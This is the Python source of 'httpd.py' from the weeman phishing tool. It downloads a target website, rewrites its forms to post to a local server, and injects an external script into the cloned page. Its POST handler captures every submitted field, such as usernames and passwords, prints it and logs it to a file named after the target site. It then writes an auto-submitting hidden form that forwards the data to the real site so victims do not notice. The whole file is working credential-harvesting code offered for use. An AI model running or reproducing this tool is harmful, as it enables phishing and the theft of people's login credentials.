#
# httpd.py - the main httpd server
#
# This file if part of weeman project
#
# See 'LICENSE' file for copying
#

import SimpleHTTPServer
import SocketServer
import urllib2
import cgi
import os
import time
from socket import error as socerr
from core.config import __version__
from core.config import __codename__
from core.misc import printt
from lib.bs4 import BeautifulSoup as bs

class handler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    ## Set server version
    server_version = "Weeman %s (%s)" %(__version__, __codename__)
    """
        log handler for Simple HTTP server
        catch the requests and parse them,
        to view the POST requests we use cgi.
    """
    def do_POST(self):
        post_request = []
        printt(3, "%s - sent POST request." %self.address_string())
        form = cgi.FieldStorage(self.rfile,
        headers=self.headers,
        environ={'REQUEST_METHOD':'POST',
                 'CONTENT_TYPE':self.headers['Content-Type'],})
        try:
            from core.shell import url
            logger = open("%s.log" %url.replace("https://", "").replace("http://", "").split("/")[0], "a")
            logger.write("\n## %s - Data for %s\n\n" %(time.strftime("%H:%M:%S - %d/%m/%y"), url))
            for tag in form.list:
                tmp = str(tag).split("(")[1]
                key,value = tmp.replace(")", "").replace("\'", "").replace(",", "").split()
                post_request.append("%s %s" %(key,value))
                printt(2, "%s => %s" %(key,value))
                logger.write("%s => %s\n" %(key,value))
            logger.close()
            from core.shell import action_url
            create_post(url,action_url, post_request)
            SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
        except socerr as e:
            printt(3, "Something wrong: (%s) igonring ..." %str(e))
        except Exception as e:
            printt(3, "Something wrong: (%s) igonring ..." %str(e))

    def log_message(self, format, *args):
        printt(3, "><> Connected : %s" %(self.address_string()))
        arg = format%args
        if arg.split()[1] == "/":
            printt(3, "><> %s - sent GET request without parameters." %self.address_string())
        else:
            if arg.split()[1].startswith("/") and "&" in arg.split()[1]:
                printt(3, "%s - sent GET request with parameters." %self.address_string())
                printt(2, "%s" %arg.split()[1])

class weeman(object):
    """
        The main class,
        start,stop,cleanup,clone website etc..
    """
    def __init__(self, url,port):
        from core.shell import url
        from core.shell import port
        self.port = port
        self.httpd = None
        self.url = url
        self.form_url = None;

    def request(self,url):
            from core.shell import user_agent
            opener = urllib2.build_opener()
            opener.addheaders = [('User-Agent', user_agent),
                    ("Accept", "text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1"),
                    #("Accept-Language","en-US,en;q=0.9,en;q=0.8"),
                    #("Accept-Encoding", "gzip;q=0,deflate,sdch"),
                    #("Accept-Charset", "ISO-8859-2,utf-8;q=0.7,*;q=0.7"),
                    ("Keep-Alive", "115"),
                    ("Connection", "keep-alive"),
                    ("DNT", "1")]
            return opener.open(self.url).read()

    def clone(self):
        from core.shell import html_file
        from core.shell import external_js
        if not html_file:
            printt(3, "Trying to get %s  ..." %self.url)
            printt(3, "Downloadng webpage ...")
            data = self.request(self.url)
        else:
            printt(3, "Loading \'%s\' ..." %html_file)
            data = open(html_file, "r").read()
        # Data
        data = bs(data, "html.parser")
        printt(3, "Modifying the HTML file ...")

        for tag in data.find_all("form"):
            tag['method'] = "post"
            tag['action'] = "ref.html"

        # Insert external script
        script = data.new_tag('script', src=external_js)
        data.html.head.insert(len(data.html.head), script)

        # Here we will attampt to load CSS/JS from the page
        # and replace ./ ../ / with the site URL.

        # Case the URL have more then one file
        try:
            uri = self.url.rsplit('/', 1)[0]
            urisp = uri.split("/")[2]

            # <link
            for tag in data.find_all("link"):
                link = tag['href']
                if link.startswith("//"):
                    pass
                elif "://" in link:
                    pass
                elif "../" in link:
                    link = link.replace("../", "%s/" %uri)
                    tag['href'] = link
                elif link.startswith("/") and not urisp in link:
                    tag['href'] = "%s%s" %(uri, link);
                elif not link.startswith("/") and not urisp  in link:
                    tag['herf'] = "%s/%s" %(uri, link);
            # <img
            for tag in data.find_all("img"):
                link = tag['src']
                if link.startswith("//"):
                    pass
                elif "://" in link:
                    pass
                elif "../" in link:
                    link = link.replace("../", "%s/" %uri)
                    tag['src'] = link
                elif link.startswith("/") and not urisp  in link:
                    tag['src'] = "%s%s" %(uri, link);
                elif not link.startswith("/") and not urisp in link:
                    tag['src'] = "%s/%s" %(uri, link);
            # <a
            for tag in data.find_all("a"):
                link = tag['href']
                if link.startswith("//"):
                    pass
                elif "://" in link:
                    pass
                elif "../" in link:
                    link = link.replace("../", "%s/" %uri)
                    tag['href'] = link
                elif link.startswith("/") and not urisp  in link:
                    tag['href'] = "%s%s" %(uri, link);
                elif not link.startswith("/") and not urisp in link:
                    tag['href'] = "%s/%s" %(uri, link);

        except IndexError:
            uri = self.url
            urisp = uri.replace("http://", "").replace("https://", "")
        except Exception as e:
            printt(3, "Something happen: (%s) igonring ..." %str(e))

        with open("index.html", "w") as index:
            index.write(data.prettify().encode('utf-8'))
            index.close()
        printt(3, "the HTML page will redirect to ref.html ...")
    def serve(self):
        printt(3, "\033[01;35mStarting Weeman %s server on http://localhost:%d\033[00m" %(__version__, self.port))
        self.httpd = SocketServer.TCPServer(("", self.port),handler)
        self.httpd.serve_forever()

    def cleanup(self):
        if os.path.exists("index.html"):
            printt(3, "\n:: Running cleanup ...")
            os.remove("index.html")
        if os.path.exists("ref.html"):
            os.remove("ref.html")

def create_post(url,action_url, post_request):
    printt(3, "Creating ref.html ...")
    red = open("ref.html","w")
    red.write("<body><form id=\"ff\" action=\"%s\" method=\"post\" >\n" %action_url)
    for post in post_request:
        key,value = post.split()
        red.write("<input name=\"%s\" value=\"%s\" type=\"hidden\" >\n" %(key,value))
    red.write("<input name=\"login\" type=\"hidden\">")
    red.write("<script langauge=\"javascript\">document.forms[\"ff\"].submit();</script>")
    red.close()
